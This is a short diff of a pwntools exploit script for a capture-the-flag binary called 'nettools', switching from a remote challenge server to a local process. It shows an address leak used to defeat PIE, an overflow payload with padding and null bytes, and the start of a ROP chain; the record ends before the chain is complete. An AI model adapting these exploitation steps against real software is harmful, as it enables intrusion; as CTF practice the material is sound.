@@ -1,8 +1,8 @@
 from pwn import *
 context(arch='amd64', os='linux')
 e = ELF('./nettools')
-#r = process('./nettools')
-r = remote('chals.sekai.team', 4001)
+r = process('./nettools')
+#r = remote('chals.sekai.team', 4001)
 #gdb.attach(r, 'break *_ZN8nettools9ip_lookup17habd4e32a9385ec12E+1029')
 r.recvuntil(b': ')
 leak = int(r.recvline().decode().strip()[2:], 16)
@@ -11,7 +11,7 @@ e.address = leak - e.symbols['_ZN8nettools6CHOICE17h0d0daa1684b4400fE']
 #print(e.address)
 r.sendline(b'3')
 payload = bytearray(b'a'*(0x348-0x60))
-payload[0x31f - 0x60] = 0x0 # can't hurt to be safe
+#payload[0x31f - 0x60] = 0x0 # can't hurt to be safe
 payload[400-1] = 0x0 # make sure counted length doesn't go over 400
 rop = ROP(e)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
